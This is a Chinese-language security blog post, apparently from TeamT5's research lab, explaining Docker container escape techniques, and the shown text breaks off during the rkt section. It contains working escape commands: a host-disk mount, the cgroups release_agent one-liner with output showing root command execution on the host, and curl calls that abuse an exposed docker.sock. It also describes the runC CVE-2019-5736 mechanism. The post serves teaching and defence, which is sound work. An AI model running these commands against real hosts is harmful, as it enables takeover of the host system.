L20.9921652,20.1829163 L20.9927319,13.1625978 C21.0044427,12.9799919 21.1719641,9.86344891 19.0257087,9.0309163 Z M7.82684783,8.83641413 L4.2731087,8.83641413 L4.2731087,20.1828054 L7.82684783,20.1828054 L7.82684783,8.83641413 Z M6.05809022,3.18481957 C4.92149239,3.18481957 3.99998152,4.10614565 3.99998152,5.24292826 C3.99998152,6.37952609 4.92149239,7.30085217 6.05809022,7.30085217 C7.19468804,7.30085217 8.11619891,6.37952609 8.11619891,5.24292826 C8.11619891,4.10614565 7.19468804,3.18481957 6.05809022,3.18481957 Z" id="Combined-Shape"></path></g></g></svg></div></a><style data-emotion="css 11g9kr1">.css-11g9kr1{-webkit-text-decoration:none;text-decoration:none;}</style><a class="css-3n5iv4 css-11g9kr1" href="https://twitter.com/teamt5_official/"><div class="css-6tkolk"><svg width="24px" height="24px" viewBox="0 0 24 24"><g id="sns/twitter/hover" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><path class="light" d="M3,0 L21,0 C22.6568542,-3.04359188e-16 24,1.34314575 24,3 L24,21 C24,22.6568542 22.6568542,24 21,24 L3,24 C1.34314575,24 2.02906125e-16,22.6568542 0,21 L0,3 C-2.02906125e-16,1.34314575 1.34314575,3.04359188e-16 3,0 Z M9.40543979,19.2 C15.5354921,19.2 18.8873246,14.1204188 18.8873246,9.71811518 C18.8873246,9.57298429 18.8873246,9.4278534 18.8804136,9.28963351 C19.5300471,8.81968586 20.0967487,8.23225131 20.5459634,7.56188482 C19.9516178,7.82450262 19.3088953,8.00418848 18.6316178,8.08712042 C19.3227173,7.67246073 19.8479529,7.02282723 20.0967487,6.24188482 C19.4540262,6.62198953 18.7421937,6.89842932 17.9819843,7.0504712 C17.3738168,6.4008377 16.5099424,6 15.5493141,6 C13.7109895,6 12.2182147,7.49277487 12.2182147,9.33109948 C12.2182147,9.59371728 12.2458586,9.84942408 12.3080576,10.0913089 C9.53674869,9.95308901 7.08334555,8.62617801 5.4385288,6.60816754 C5.15517801,7.09884817 4.98931414,7.67246073 4.98931414,8.28062827 C4.98931414,9.4347644 5.57674869,10.4575916 6.47517801,11.0519372 C5.92920942,11.0381152 5.41779581,10.8860733 4.96858115,10.6372775 C4.96858115,10.6510995 4.96858115,10.6649215 4.96858115,10.6787435 C4.96858115,12.2959162 6.11580628,13.6366492 7.64313613,13.947644 C7.36669634,14.0236649 7.06952356,14.0651309 6.76543979,14.0651309 C6.55119895,14.0651309 6.34386911,14.0443979 6.13653927,14.0029319 C6.55810995,15.3298429 7.78826702,16.2904712 9.24648691,16.3181152 C8.10617277,17.2096335 6.66868586,17.7417801 5.10680105,17.7417801 C4.83727225,17.7417801 4.57465445,17.7279581 4.31203665,17.6934031 C5.77025654,18.6471204 7.52564921,19.2 9.40543979,19.2"></path></g></svg></div></a></div></div></div></div></div></nav></div><div class="css-1b3tozc"></div></header></div><main class="css-iwv7r0"><div class="css-ht0vth"><div class="css-w4jotj" style="background-image:url(https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/f_auto/v1599804537/emergency-exit-1321134_1920_6420b1abb7.jpg)"></div><div class="css-1vd4pj2"><div class="css-f24dyb"><div style="background-color:#64cda2" class="css-1f7e94x">技術分析</div><a class="css-cf47rh">RSS</a></div><h1>Container Escape 101</h1></div></div><div class="css-14r7lg1 default"><div class="css-8x5obk"><div class="css-t9u2dq"><div class="css-1isrddr"><div class="css-4api5d"><div>2020. 09. 16</div><div class="css-57sp39"></div><div>D39</div></div><div class="css-k6q0dt">Share:<div class="css-3ostf4"><a class="css-8xetqx"><button aria-label="linkedin" class="react-share__ShareButton share" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><div class="css-6tkolk"><svg width="24px" height="24px" viewBox="0 0 24 24"><g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="sns/linkedin/nor"><path class="dark" d="M21,0 C22.6568542,-3.04359188e-16 24,1.34314575 24,3 L24,21 C24,22.6568542 22.6568542,24 21,24 L3,24 C1.34314575,24 2.02906125e-16,22.6568542 0,21 L0,3 C-2.02906125e-16,1.34314575 1.34314575,3.04359188e-16 3,0 L21,0 Z M19.0257087,9.0309163 C16.1146435,7.90189457 14.1125239,9.13845978 13.5311978,10.2828185 L13.5311978,10.2828185 L13.4415783,10.4056989 L13.3876217,10.4056989 L13.3876217,8.83634022 L10.0184804,8.83634022 L10.0184804,20.1829163 L13.5311978,20.1829163 L13.5316179,14.0152782 C13.5352018,13.9482549 13.5643166,13.4915116 13.7156109,12.9431337 C13.879513,12.3490576 14.4018935,11.8678837 15.0368065,11.7243076 C15.6717196,11.5811011 16.2554478,11.7243076 16.5934152,11.8678837 C16.9313826,12.0110902 17.1054478,12.3643946 17.1745565,12.471938 C17.2436652,12.5794815 17.458937,13.2476554 17.458937,13.6240576 L17.458937,13.6240576 L17.458937,20.1829163 L20.9921652,20.1829163 L20.9927319,13.1625978 C21.0044427,12.9799919 21.1719641,9.86344891 19.0257087,9.0309163 Z M7.82684783,8.83641413 L4.2731087,8.83641413 L4.2731087,20.1828054 L7.82684783,20.1828054 L7.82684783,8.83641413 Z M6.05809022,3.18481957 C4.92149239,3.18481957 3.99998152,4.10614565 3.99998152,5.24292826 C3.99998152,6.37952609 4.92149239,7.30085217 6.05809022,7.30085217 C7.19468804,7.30085217 8.11619891,6.37952609 8.11619891,5.24292826 C8.11619891,4.10614565 7.19468804,3.18481957 6.05809022,3.18481957 Z" id="Combined-Shape"></path></g></g></svg></div></button></a><a class="css-8xetqx"><button aria-label="twitter" class="react-share__ShareButton share" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><div class="css-6tkolk"><svg width="24px" height="24px" viewBox="0 0 24 24"><g id="sns/twitter/hover" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><path class="dark" d="M3,0 L21,0 C22.6568542,-3.04359188e-16 24,1.34314575 24,3 L24,21 C24,22.6568542 22.6568542,24 21,24 L3,24 C1.34314575,24 2.02906125e-16,22.6568542 0,21 L0,3 C-2.02906125e-16,1.34314575 1.34314575,3.04359188e-16 3,0 Z M9.40543979,19.2 C15.5354921,19.2 18.8873246,14.1204188 18.8873246,9.71811518 C18.8873246,9.57298429 18.8873246,9.4278534 18.8804136,9.28963351 C19.5300471,8.81968586 20.0967487,8.23225131 20.5459634,7.56188482 C19.9516178,7.82450262 19.3088953,8.00418848 18.6316178,8.08712042 C19.3227173,7.67246073 19.8479529,7.02282723 20.0967487,6.24188482 C19.4540262,6.62198953 18.7421937,6.89842932 17.9819843,7.0504712 C17.3738168,6.4008377 16.5099424,6 15.5493141,6 C13.7109895,6 12.2182147,7.49277487 12.2182147,9.33109948 C12.2182147,9.59371728 12.2458586,9.84942408 12.3080576,10.0913089 C9.53674869,9.95308901 7.08334555,8.62617801 5.4385288,6.60816754 C5.15517801,7.09884817 4.98931414,7.67246073 4.98931414,8.28062827 C4.98931414,9.4347644 5.57674869,10.4575916 6.47517801,11.0519372 C5.92920942,11.0381152 5.41779581,10.8860733 4.96858115,10.6372775 C4.96858115,10.6510995 4.96858115,10.6649215 4.96858115,10.6787435 C4.96858115,12.2959162 6.11580628,13.6366492 7.64313613,13.947644 C7.36669634,14.0236649 7.06952356,14.0651309 6.76543979,14.0651309 C6.55119895,14.0651309 6.34386911,14.0443979 6.13653927,14.0029319 C6.55810995,15.3298429 7.78826702,16.2904712 9.24648691,16.3181152 C8.10617277,17.2096335 6.66868586,17.7417801 5.10680105,17.7417801 C4.83727225,17.7417801 4.57465445,17.7279581 4.31203665,17.6934031 C5.77025654,18.6471204 7.52564921,19.2 9.40543979,19.2"></path></g></svg></div></button></a><a class="css-8xetqx"><button aria-label="facebook" class="react-share__ShareButton share" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><div class="css-6tkolk"><svg width="24px" height="24px" viewBox="0 0 24 24" version="1.1"><g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><path class="dark" d="M22,0 C23.1045695,-2.02906125e-16 24,0.8954305 24,2 L24,22 C24,23.0543618 23.1841222,23.9181651 22.1492623,23.9945143 L22,24 L22,24 L14,24 L14,23.978 L13.875,24 L13.875,15.5633307 L16.6710937,15.5633307 L17.203125,12.0733717 L13.875,12.0733717 L13.875,9.80860051 C13.875,8.85381375 14.3398828,7.92315016 15.8305781,7.92315016 L15.8305781,7.92315016 L17.34375,7.92315016 L17.34375,4.95196885 C17.34375,4.95196885 15.9704766,4.71616081 14.6575781,4.71616081 C11.9165156,4.71616081 10.125,6.3875682 10.125,9.41345698 L10.125,9.41345698 L10.125,12.0733717 L7.078125,12.0733717 L7.078125,15.5633307 L10.125,15.5633307 L10.125,24 C10.0832306,23.9934058 10.0415327,23.9865949 9.99990751,23.9795684 L10,24 L2,24 C0.8954305,24 1.3527075e-16,23.1045695 0,22 L0,2 C-1.3527075e-16,0.8954305 0.8954305,2.02906125e-16 2,0 L22,0 Z" id="path-1"></path></g></svg></div></button></a></div></div></div><div class="css-17crpi9"><div class="css-x9vory"><div><p>圖片來源：<a href="https://pixabay.com/photos/emergency-exit-exit-sign-escape-1321134/">Pixabay</a></p><h2 id="">前言</h2><p>本月來到 D39 與大家分享近期有趣的研究，Lab 團隊雖然不像是科幻電影中的實驗室般，穿著帥氣的白袍與擁有高科技的實驗室，但我們主要專注於最新技術與威脅研究，與惡意程式作者們互相切磋是我們的日常。而 Lab 中的 D39 成員更致力於弱點安全與漏洞挖掘領域，研究範圍包含 Mobile、IOT、Linux、Windows 等有機會連網的系統與裝置都是我們的目標，期許能提升客戶產品安全性，打造優良的上網環境（笑）</p><p>這一次由 D39 實習生 Jack，為我們精心整理 Container 相關的弱點攻擊方式，透過清楚易懂的介紹，帶大家了解究竟在駭客眼中的 Container，存在哪些資安問題呢？</p><h2 id="">正文開始</h2><p>相信大家對 Docker 都不陌生，無論是想要架設網站、資料庫或郵件伺服器，只要一行 <code>docker run</code> 就能搞定，不用處理可怕的環境問題，但若它存在漏洞或一些錯誤的設定，跑在 Container 內的 Process 就有可能控制主機。</p><p>這次與大家介紹 Container Escape 的一些攻擊方法，讓各位在使用 Container 時可以留意相關的安全隱憂，以及了解這些漏洞造成的影響。</p><h2 id="container">Container</h2><p>在介紹攻擊方法之前，先來了解一下 Container 使用到的技術：</p><ul><li><div>Namespaces</div></li><li><div>Cgroups</div></li><li><div>Seccomp</div></li><li><div>Capabilities</div></li><li><div>LSM</div></li><li><div>OverlayFS</div></li></ul><h3 id="namespaces">Namespaces</h3><p>Container 好用的地方在於，它能夠建立一個獨立的環境，可以放心地安裝一大堆想嘗試的套件，不怕弄髒自己的環境。要實現這個功能，Namespaces 扮演了一個很重要的角色。</p><p>來看看 Linux Programmer&#x27;s Manual <a href="https://man7.org/linux/man-pages/man7/namespaces.7.html">Man page</a> 的描述：</p><blockquote><p>A namespace wraps a global system resource in an abstraction that makes it appear to the processes within the namespace that they have their own isolated instance of the global resource.  Changes to the global resource are visible to other processes that are members of the namespace, but are invisible to other processes.  One use of namespaces is to implement containers.</p></blockquote><p>這邊的「資源」（resource）指的就像 Mount point 或 PID，Namespaces 可以建立一個獨立的 Mount point 或 PID，讓 Container 僅能存取自己掛載的檔案系統或自己的 Process，與 Host 隔離開來，不會弄亂 Host 的檔案，或存取到 Host 的 Process 資訊。</p><p>使用 Namespaces 的方式就是呼叫 <code>unshare</code>、<code>setns</code>、<code>clone</code> 等 System call，類別也不只有 Mount 與 PID，詳細可以看 <a href="https://man7.org/linux/man-pages/man7/namespaces.7.html">Man page</a>。</p><h3 id="cgroups">Cgroups</h3><p>Cgroups 透過 <code>cgroupfs</code> 控制 Process 所能使用的記憶體容量或 CPU 資源，讓 Process 不會因為一些 bug 讓整台電腦當機，Docker 可以用 <code>--cpu-shares</code> 來限制各個 Container 能用到的 CPU 資源。詳細請見 <a href="https://man7.org/linux/man-pages/man7/cgroups.7.html">Cgroups man page</a>。</p><h3 id="seccomp">Seccomp</h3><p>Seccomp (Secure Computing) 對 CTFer 可能不陌生，用來限制能夠使用的 System call，常見於一些 Shellcode 題。</p><p>Container 很常禁用 <code>mount</code> ，因為它是一個方便我們逃離 Container 的 System call，接下來就會說明如何利用 <code>mount</code> 逃出 Container。詳細請見 <a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">Seccomp man page</a>。</p><h3 id="capabilities">Capabilities</h3><p>Capabilities 從 Linux Kernel 2.2 開始加入，目的是將權限做更細緻的區隔，以 Container 來說，若直接給它 <code>root</code> 權限是不安全的，這意味著它可以隨意載入 Kernel module 或 <code>mount</code>，讓 Container 有機會存取 Host 資源，因此 Container 內的 <code>root</code> 只有一些基本的 Capabilities，如 CAP_CHOWN、CAP_KILL、CAP_SETUID、CAP_SETGID 等。Ubuntu 使用者可以安裝 <code>libcap2-bin</code> 並使用 <code>getpcaps {pid}</code> 查看該 Process 擁有哪些 Capabilities，詳細請看 <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">man page</a>。</p><h3 id="lsm-linux-security-module">LSM (Linux Security Module)</h3><p>Linux kernel 文件裡寫道：</p><blockquote><p>The primary users of the LSM interface are Mandatory Access Control (MAC) extensions which provide a comprehensive security policy.</p></blockquote><p>如 AppArmor 和 SELinux 都是 Linux Kernel 內建的 Security Module，透過它們專屬的設定檔可以限制 Process 的存取權限，像 Docker 就是使用 AppArmor 限制 <code>procfs</code> 以及 <code>mount</code>，保護 Host 資源。</p><h3 id="overlayfs">OverlayFS</h3><p>許多 Container 使用 OverlayFS 當作它的檔案系統，如它的名字，目的就是要把兩個或多個檔案系統合併，讓它看起來是一個檔案系統。它使用了 <code>upper</code> 與 <code>lower</code> 區分兩種要合併的檔案系統，其中若 <code>upper</code> 與 <code>lower</code> 有相同檔案時，會以 <code>upper</code> 為主。我們用 Container 來解釋，Docker 把 <code>upper</code> 當作 Container layer、<code>lower</code> 當作 Image layer，我們在 <code>docker build</code> 的時候會產生 Image，利用這些 Image 我們可以很快地產出 Container，在 Image 內的檔案如 Ubuntu 預設的系統檔案就會被放在 Image layer，在 Container runtime 產生的檔案，例如 Log 檔會被放在 Container layer，這麼一來建立多個 Container 時可以讓它們的 Image layer 都是同一個，省下許多空間。</p><p>來實驗一下，首先開兩個 Container：</p><pre><code>$ docker run --name t1 -it ubuntu
root@e937832abc06:/#</code></pre><pre><code>$ docker run --name t2 -it ubuntu
root@71c8a58e90ac:/#</code></pre><p>檢查它們的 LowerDir：</p><pre><code>$ docker inspect t1 | grep Lower
                &quot;LowerDir&quot;: ...:/var/lib/docker/overlay2/07a2cbd7...dbdf/diff:...,
$ docker inspect t2 | grep Lower
                &quot;LowerDir&quot;: ...:/var/lib/docker/overlay2/07a2cbd7...dbdf/diff:...,</code></pre><p>仔細一看，列出來的路徑幾乎是一樣的，接下來看看裡面有什麼：</p><pre><code>$ sudo ls -alF /var/lib/docker/overlay2/07a2cbd7...dbdf/diff
total 24
drwxr-xr-x 6 root root 4096 Nov 13  2019 ./
drwx------ 4 root root 4096 Nov 13  2019 ../
drwxr-xr-x 4 root root 4096 Nov  1  2019 etc/
drwxr-xr-x 2 root root 4096 Nov  1  2019 sbin/
drwxr-xr-x 3 root root 4096 Oct 30  2019 usr/
drwxr-xr-x 3 root root 4096 Oct 30  2019 var/</code></pre><p>是很常見的系統資料夾！也就是 Image layer，接下來看 Container layer：</p><pre><code>root@e937832abc06:/# echo &#x27;hello, host&#x27; &gt; /hello</code></pre><p>先在 Container 內創立一個檔案：</p><pre><code>$ docker inspect e937 | grep Upper
                &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/657597a...a966/diff&quot;,
$ sudo cat /var/lib/docker/overlay2/657597a...a966/diff/hello
hello, host</code></pre><p>然後用 <code>docker inspect</code> 找到 UpperDir，就會看到我們建立的 <code>hello</code> 檔案了！</p><br/><h2 id="container-escape">Container Escape</h2><p>來試想一個情境，有一台主機遵守 Microservices 的精神，使用 Docker 分別架設了網站、資料庫與郵件伺服器這三個 Container，假設郵件伺服器存在漏洞被駭客入侵，也不會直接影響到網站和資料庫，維護的工程師也能很快的用 Docker 換成新版本來進行即時修補。但如果 Container 存在漏洞時，所有的服務都有可能陷入風險。</p><h3 id="privileged-container">Privileged Container</h3><p>我們先從比較容易 Escape 的 Privileged Container 開始，Privileged Container 沒有 Seccomp 限制且 Capability 全開，讓 Container 可以存取所有硬體設備，為的就是讓這個 Container 有獨立的環境且能做 Host 能做的事。Docker 建立 Privileged container 的方法很簡單，只要在 <code>dokcer run</code> 時多加個 <code>--privileged</code> flag 即可。</p><p><code>docker run --privileged -it ubuntu</code></p><p>另外還有一個很棒的功能，用 Docker 跑 Docker。聽起來很奇怪但很合理，如果去看 Docker 的<a href="https://github.com/docker/docker-ce/blob/master/components/engine/docs/contributing/set-up-dev-env.md">開發文件</a>，會發現 Docker 是用 Docker 開發的。</p><p>一般來說開發用的 Privileged container 駭客碰不到，但如果是用 Docker 架設 CI/CD 工具，然後使用這些工具的 Docker 功能呢？歡迎參考<a href="https://www.slideshare.net/Docker/build-publish-deploy-and-test-docker-images-and-containers-with-jenkins-workflow">這篇</a>的 &quot;How Can You Use Jenkins &amp; Docker Together&quot;。</p><p>沒錯，你需要一個 Privileged container 來運行 CI/CD 工具！接下來先以 Privileged container 為例，說明在我們打下有漏洞的 CI/CD 工具且有 <code>root</code> 權限後，要怎麼控制 Host。</p><h4 id="mount-root">Mount root</h4><p>第一個要介紹的是這個一直被針對的 <code>mount</code> ，在 Privileged container 裡是可以直接使用的，來看看如何透過它存取 Host 檔案。</p><p>首先先取得 Block device 的 Major 與 Minor：</p><pre><code>root@997453a4062f:/test# ls -alF /sys/dev/block/ | grep sda1
lrwxrwxrwx 1 root root 0 Aug 12 06:50 8:1 -&gt; ../../devices/pci0000:00/0000:00:01.1/ata1/host0/target0:0:0/0:0:0:0/block/sda/sda1/</code></pre><p><code>sda1</code> 是 Host 的根目錄（不同的電腦可能不一樣，對駭客來說可以全部都試試看）。接下來用 <code>mknod</code> 產 Block special file 然後 <code>mount</code>，就會把 Host 的根目錄放在 Container 內了（若 <code>/dev/sda1</code> 不存在才需要使用 <code>mknod</code>）。</p><p>Docker:</p><pre><code>root@997453a4062f:/test# mknod /dev/myroot b 8 1
root@997453a4062f:/test# mkdir rootfs; mount /dev/myroot rootfs
root@997453a4062f:/test# echo hello, host! &gt; rootfs/hello</code></pre><p>Host:</p><pre><code>root@escape:/# cat /hello
hello, host!</code></pre><h4 id="cgroups-v1-release-notification">Cgroups v1 release notification</h4><p>只能存取 <code>root</code> 資料夾還不夠！我們的目標是能在 Host 上做任何事且不受 Container 影響。接下來要介紹的是 <a href="https://twitter.com/_fel1x/status/1151487051986087936">Felix Wilhelm 在 Twitter 上寫的</a>：</p><blockquote><p>Quick and dirty way to get out of a privileged k8s pod or docker container by using cgroups release_agent feature.</p></blockquote><pre><code>d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 &gt;$d/w/notify_on_release
t=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`
touch /o; echo $t/c &gt;$d/release_agent;echo &quot;#!/bin/sh
$1 &gt;$t/o&quot; &gt;/c;chmod +x /c;sh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot;;sleep 1;cat /o</code></pre><p>直接用 Docker 跑跑看：</p><pre><code>$ docker run --privileged -it ubuntu
root@acf8f56c9de6:/test# cat &gt; exp.sh
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 &gt;$d/w/notify_on_release
t=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`
touch /o; echo $t/c &gt;$d/release_agent;echo &quot;#!/bin/sh
$1 &gt;$t/o&quot; &gt;/c;chmod +x /c;sh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot;;sleep 1;cat /o
root@acf8f56c9de6:/test# chmod +x ./exp.sh
root@acf8f56c9de6:/test# ./exp.sh ps
  PID TTY          TIME CMD
    1 ?        00:01:31 systemd
    2 ?        00:00:00 kthreadd
    3 ?        00:00:00 rcu_gp
    4 ?        00:00:00 rcu_par_gp
    6 ?        00:00:00 kworker/0:0H-kb
    9 ?        00:00:00 mm_percpu_wq
   10 ?        00:00:15 ksoftirqd/0
   11 ?        00:09:23 rcu_sched
   12 ?        00:00:02 migration/0
   13 ?        00:00:00 idle_inject/0
   14 ?        00:00:00 cpuhp/0
   15 ?        00:00:00 cpuhp/1
   16 ?        00:00:00 idle_inject/1
   17 ?        00:00:03 migration/1
   18 ?        00:00:05 ksoftirqd/1
   20 ?        00:00:00 kworker/1:0H-ev
   ...
root@acf8f56c9de6:/test# ./exp.sh id
uid=0(root) gid=0(root) groups=0(root)</code></pre><p>太棒了！可以在 Container 外執行任意指令且是 <code>root</code> 權限。接下來分析它怎麼做到的：</p><pre><code>root@acf8f56c9de6:/test# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
root@acf8f56c9de6:/test# echo $d
/sys/fs/cgroup/rdma</code></pre><p><code>d</code> 變數的目的是取得 Cgroups 底下有 <code>release_agent</code> 檔案的路徑，<code>release_agent</code> 的描述可參考 <a href="https://man7.org/linux/man-pages/man7/cgroups.7.html">Man page</a>：</p><blockquote><p>A special file in the root directory of each cgroup hierarchy, release_agent, can be used to register the pathname of a program that may be invoked when a cgroup in the hierarchy becomes empty.</p></blockquote><p>變為空的意思：</p><blockquote><p>A cgroup is considered to be empty when it contains no child cgroups and no member processes.</p></blockquote><p><code>release_agent</code> 一般用來讓使用者自訂腳本，清理新建的 Cgroups 讓 <code>cgroupfs</code> 保持乾淨，而它會在 Host 以 <code>root</code> 權限執行，所以只要能控制 <code>release_agent</code>，我們就可以在 Container 外執行任意指令。</p><p>在 Cgroups 資料夾底下創立一個 <code>w</code> 資料夾，會讓 Cgroups 創立一個新的群組，然後啟用這個群組的 <code>notify_on_release</code>：</p><pre><code>mkdir -p $d/w;echo 1 &gt;$d/w/notify_on_release</code></pre><p><code>t</code> 變數是找出 Host 可以直接看到 Container 檔案的路徑，也就是 OverlayFS 的 UpperDir (Container layer) ，以便 <code>release_agent</code> 能夠呼叫 Container 內的惡意腳本：</p><pre><code>t=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`</code></pre><p>最後一步把 <code>release_agent</code> 指到我們能控制的惡意腳本，然後利用 <code>echo 0 &gt; $d/w/cgroup.procs</code> 把 <code>echo</code> 加入 <code>w</code> 這個 Cgroups，待 <code>echo</code> 結束後就會觸發 <code>notify_on_release</code> 然後呼叫 <code>release_agent</code>：</p><pre><code>touch /o; echo $t/c &gt;$d/release_agent;echo &quot;#!/bin/sh
$1 &gt;$t/o&quot; &gt;/c;chmod +x /c;sh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot;;sleep 1;cat /o</code></pre><p>可以發現我們主要用到的功能是 Cgroups 以及 <code>mount</code>，因此這個利用方式有個修訂版本，只要使用 <code>docker run -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash</code> 就可以利用較少的權限 Escape，詳細可以看<a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">這篇文章</a>。</p><iframe src="https://asciinema.org/a/356357/embed?" id="asciicast-iframe-356357" name="asciicast-iframe-356357" scrolling="no" allowfullscreen="" style="overflow:hidden;margin:0px;border:0px;display:inline-block;width:100%;float:none;visibility:visible;height:468px;:"></iframe><h4 id="exposed-dockersock">Exposed docker.sock</h4><p>用 Docker 跑 Docker 的方式還有這個：</p><pre><code>docker run -v /var/run/docker.sock:/var/run/docker.sock</code></pre><p><code>dockerd</code> 開啟後預設會在 <code>/var/run/docker.sock</code> 聽取命令，等待使用者送出 Docker 指令後，<code>docker-cli</code> 會把指令轉成一定的格式跟 <code>docker.sock</code> 溝通，所以把這個檔案映射到 Container 內，等同於讓這個 Container 能夠用 Host 的名義建立 Container。</p><p>我們可以簡單的使用 <code>curl</code> 控制 <code>docker.sock</code>：</p><pre><code>$ curl -XPOST --unix-socket /var/run/docker.sock -d &#x27;{&quot;Image&quot;:&quot;ubuntu&quot;, &quot;Privileged&quot;:true}&#x27; -H &#x27;Content-Type: application/json&#x27; http://localhost/containers/create
{&quot;Id&quot;:&quot;8e89909670942daa92999f337fb325b4a89f6a2dd2f5fcf9e972ca089c5b751a&quot;,&quot;Warnings&quot;:[]}
$ curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/8e89909670942daa92999f337fb325b4a89f6a2dd2f5fcf9e972ca089c5b751a/start</code></pre><p>只要對 <code>docker.sock</code> 發送請求就能創立一個 Container！可以用上面的方法開啟一個 Privileged container，再利用前面的手法拿到 Host 控制權！</p><br/><h3 id="container-engine-bug">Container Engine bug</h3><p>不過一般的服務如郵件伺服器，它不需要用 Docker 跑 Docker 的功能，也就不會以 <code>--privileged</code> 的方式運行，所以就算利用漏洞拿到 Container 的 <code>root</code> 權限，也不能用 <code>mount</code> 或 <code>docker.sock</code> 的方式 Escape，但如果 Container Engine 本身有漏洞，就有機會利用它控制 Host。</p><h4 id="runc-cve-2019-5736">runC CVE-2019-5736</h4><p>第一個要介紹的是 runC (run container)，它是一個根據 OCI 規範用來運行 Container 的程式，被許多 Container engine 呼叫，例如：Docker、Kubernets、LXC 等，因此這個漏洞影響範圍相當大（<a href="https://www.cvedetails.com/cve/CVE-2019-5736/">詳細受影響清單</a>）。而攻擊條件是駭客在 Container 內有 <code>root</code> 權限，或 Container Engine 執行了惡意的 Container。</p><p>它的漏洞原因在於，新的 Process 若是 <code>/proc/self/exe</code>，就能利用殘留的 File descriptor 改寫 runC 這隻程式，等到下次有人使用 Docker 時就會執行被改寫的 runC，而 Docker 是用 <code>root</code> 權限運行的，因此就獲得了 <code>root</code> 的任意命令執行！</p><p>先來看 Process 在正常狀況下是如何被放進 Container。在執行 <code>docker exec</code> 的時候 runC 會把自己放進 Container 的 Namespace 然後再 <code>execve(&quot;binary&quot;)</code>：</p><p><img alt="Blog_9-6" src="https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-6_2c8cdf52db.png" class="css-1h5x3dy"/></p><p>但 Process 若指定成 <code>/proc/self/exe</code> 就會指回 runC 本身：</p><p><img alt="Blog_9-7" src="https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544713/Blog_9-7_011278ad04.png" class="css-1h5x3dy"/></p><p>有趣的事情發生了！runC 執行 <code>execve(&quot;/proc/self/exe&quot;)</code>，也就是再跑了一次 runC，但用的 Library 是 Container 內的 Library，所以我們可以改寫 Container 內的 <code>libc</code> 或 <code>libseccomp</code> 之類的 runC 會用到的 Dynamic library，執行任意的程式碼！</p><p><img alt="Blog_9-8" src="https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-8_2620f0f070.png" class="css-1h5x3dy"/></p><p>有任意程式碼執行後重複開啟 <code>/proc/self/exe</code>，就能存取 Host 的 runC 程式，但在 Linux 裡執行中的程式是不能被修改的，所以先用 <code>open</code> 的 <code>O_PATH</code> 模式留下 File descriptor，但不開啟檔案然後 <code>fork</code> 讓子程序對 runC 寫入惡意指令，接下來只要等待下一次的 <code>docker exec</code> 就會觸發惡意指令！</p><p><img alt="Blog_9-9" src="https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-9_fb31bbc0f3.png" class="css-1h5x3dy"/></p><p>這個漏洞是 CTF 隊伍 Dragon Sector 打完比賽後獲得靈感而研究出來的漏洞，詳細的挖掘過程在他們的<a href="https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html">部落格</a>，以及他們的 <a href="https://www.openwall.com/lists/oss-security/2019/02/13/3">Exploit Code</a>。</p><iframe src="https://asciinema.org/a/356360/embed?" id="asciicast-iframe-356360" name="asciicast-iframe-356360" scrolling="no" allowfullscreen="" style="overflow:hidden;margin:0px;border:0px;display:inline-block;width:100%;float:none;visibility:visible;height:468px;:"></iframe><br/><h4 id="rkt-cve-2019-10144cve-2019-10145cve-2019-10147">rkt CVE-2019-10144/CVE-2019-10145/CVE-2019-10147</h4><p>rkt 也是一個 Container engine，但已經沒有在維護了，所以這三個 CVE 到現在還是可以利用，不過利用條件較為嚴苛，駭客需要控制由 <code>rkt enter</code> 開啟的 Process 才能 Escape（一般狀況下會以 <code>rkt run</code> 的方式開啟）。</p><p><code>rkt enter</code> 就像是 <code>docker exec</code>，可以在指定的 Container 內執行程式，但使用 <code>rkt enter</code> 執行的程式擁有所有的 Capabilities ，沒有 Seccomp 限制也沒有隔離 Cgroups。就像個 Privileged Container！</p><p>所以使用 <code>getpcaps $$</code> 看到所有 Capabilities 的話，恭喜你，你處在一個可以 Container Escape 的環境內！</p><p>來看看利用方法，首先下載最新版的 rkt：</p><pre><code>wget https://github.com/rkt/rkt/releases/download/v1.30.0/rkt-v1.30.0.tar.gz
tar xzvf rkt-v1.30.0.tar.gz
cd rkt-v1.30.0
./rkt help</code></pre><p>用 <code>getpcaps</code> 檢查看看：</p><pre><code>$ sudo ./rkt --insecure-options=image --interactive=true  run docker://libpcap/libpcap
root@rkt-9354bcca-e188-453f-942c-6c1ae056ef70:/# getpcaps $$
Capabilities for `6&#x27;: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep</code></pre><pre><code>$ sudo ./rkt enter 9354 /bin/bash
root@rkt-9354bcca-e188-453f-942c-6c1ae056ef70:/# getpcaps $$
